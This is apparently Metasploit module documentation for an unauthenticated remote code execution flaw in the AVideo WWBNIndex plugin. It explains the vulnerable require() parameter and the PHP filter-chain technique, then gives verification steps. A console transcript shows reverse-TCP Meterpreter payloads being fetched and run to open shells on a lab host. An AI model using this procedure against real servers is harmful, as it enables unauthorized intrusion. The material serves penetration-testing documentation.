## Vulnerable Application

This Metasploit module exploits an unauthenticated Remote Code Execution vulnerability in the AVideo platform,
specifically within the WWBNIndex plugin.
The vulnerability exists due to improper input validation in the `submitIndex.php` file, where the `systemRootPath` parameter
is directly passed to a `require()` PHP function without proper sanitization.
Attackers can exploit this by leveraging the PHP filter chaining technique
to execute arbitrary PHP code on the server.
The vulnerability is present in versions from 12.4 up to 14.2.

To set up a vulnerable environment for testing, follow the installation steps provided in the AVideo documentation for running with Docker:
<https://github.com/WWBN/AVideo/wiki/Running-AVideo-with-Docker>.
Ensure AVideo version installed is between 12.4 and 14.2 and the WWBIndex plugin is installed.
This can be done by verifying `/var/www/html/AVideo/plugin/WWBNIndex` exists.

## Verification Steps

1. Start `msfconsole` in your Metasploit framework.
2. Use the module: `use exploit/multi/http/avideo_wwbnindex_unauth_rce`.
3. Set `RHOSTS` to the target's address where the AVideo platform is installed.
4. Set `TARGETURI` to the base path of the AVideo installation if it is not at the root directory (default is `/`).
5. Optionally, configure other options such as `SSL` and `RPORT` if the target environment requires it.
6. Execute the exploit using the `run` or `exploit` command.
7. If the target is vulnerable, the module will execute the specified payload, granting access according to the payload's capabilities.

## Options

No options

## Scenarios

### Successful Exploitation against AVideo Platform with WWBNIndex plugin version 12.9

**Setup**:

- Target: AVideo platform with WWBNIndex plugin version 12.9 installed in a Docker container.
- Attacker: Metasploit Framework.

**Example**:

```
msf6 > search avideo

Matching Modules
================

   #  Name                                            Disclosure Date  Rank       Check  Description
   -  ----                                            ---------------  ----       -----  -----------
   0  exploit/multi/http/avideo_wwbnindex_unauth_rce  2024-04-04       excellent  Yes    AVideo WWBNIndex Plugin Unauthenticated RCE
   1    \_ target: Automatic                          .                .          .      .
   2    \_ target: PHP In-Memory                      .                .          .      .
   3    \_ target: Unix In-Memory                     .                .          .      .
   4    \_ target: Windows In-Memory                  .                .          .      .


Interact with a module by name or index. For example info 4, use 4 or use exploit/multi/http/avideo_wwbnindex_unauth_rce
After interacting with a module you can manually set a TARGET with set TARGET 'Windows In-Memory'

msf6 > use 3
[*] Additionally setting TARGET => Unix In-Memory
[*] Using configured payload cmd/linux/http/x64/meterpreter/reverse_tcp
msf6 exploit(multi/http/avideo_wwbnindex_unauth_rce) > options

Module options (exploit/multi/http/avideo_wwbnindex_unauth_rce):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                    yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT    443              yes       The target port (TCP)
   SSL      true             no        Negotiate SSL/TLS for outgoing connections
   VHOST                     no        HTTP server virtual host


Payload options (cmd/linux/http/x64/meterpreter/reverse_tcp):

   Name                Current Setting  Required  Description
   ----                ---------------  --------  -----------
   FETCH_COMMAND       CURL             yes       Command to fetch payload (Accepted: CURL, FTP, TFTP, TNFTP, WGET)
   FETCH_DELETE        false            yes       Attempt to delete the binary after execution
   FETCH_FILENAME      nhjkrZakk        no        Name to use on remote system when storing payload; cannot contain spaces or slashes
   FETCH_SRVHOST                        no        Local IP to use for serving payload
   FETCH_SRVPORT       8080             yes       Local port to use for serving payload
   FETCH_URIPATH                        no        Local URI to use for serving payload
   FETCH_WRITABLE_DIR  /tmp             yes       Remote writable dir to store payload; cannot contain spaces
   LHOST                                yes       The listen address (an interface may be specified)
   LPORT               4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   2   Unix In-Memory



View the full module info with the info, or info -d command.

msf6 exploit(multi/http/avideo_wwbnindex_unauth_rce) > set rhosts 192.168.100.20
rhosts => 192.168.100.20
msf6 exploit(multi/http/avideo_wwbnindex_unauth_rce) > set lhost eth0
lhost => 192.168.100.10
msf6 exploit(multi/http/avideo_wwbnindex_unauth_rce) > set lport 1337
lport => 1337
msf6 exploit(multi/http/avideo_wwbnindex_unauth_rce) > set fetch_srvport 5000
fetch_srvport => 5000
msf6 exploit(multi/http/avideo_wwbnindex_unauth_rce) > exploit

[*] Started reverse TCP handler on 192.168.100.10:1337
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target is vulnerable. Detected vulnerable AVideo version: 12.9
[*] Sending stage (3045380 bytes) to 192.168.100.20
[*] Meterpreter session 1 opened (192.168.100.10:1337 -> 192.168.100.20:52936) at 2024-04-04 23:08:05 +0200

meterpreter > sysinfo
Computer     : 192.168.100.20
OS           : Ubuntu 20.04 (Linux 5.4.0-169-generic)
Architecture : x64
BuildTuple   : x86_64-linux-musl
Meterpreter  : x64/linux
meterpreter > exit
[*] Shutting down session: 1

[*] 192.168.100.20 - Meterpreter session 1 closed.  Reason: Died
msf6 exploit(multi/http/avideo_wwbnindex_unauth_rce) > use 2
[*] Additionally setting TARGET => PHP In-Memory
[*] Using configured payload php/meterpreter/reverse_tcp
msf6 exploit(multi/http/avideo_wwbnindex_unauth_rce) > exploit

[*] Started reverse TCP handler on 192.168.100.10:1337
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target is vulnerable. Detected vulnerable AVideo version: 12.9
[*] Sending stage (39927 bytes) to 192.168.100.20
[*] Meterpreter session 2 opened (192.168.100.10:1337 -> 192.168.100.20:36258) at 2024-04-04 23:08:44 +0200

meterpreter > getuid
Server username: www-data
```
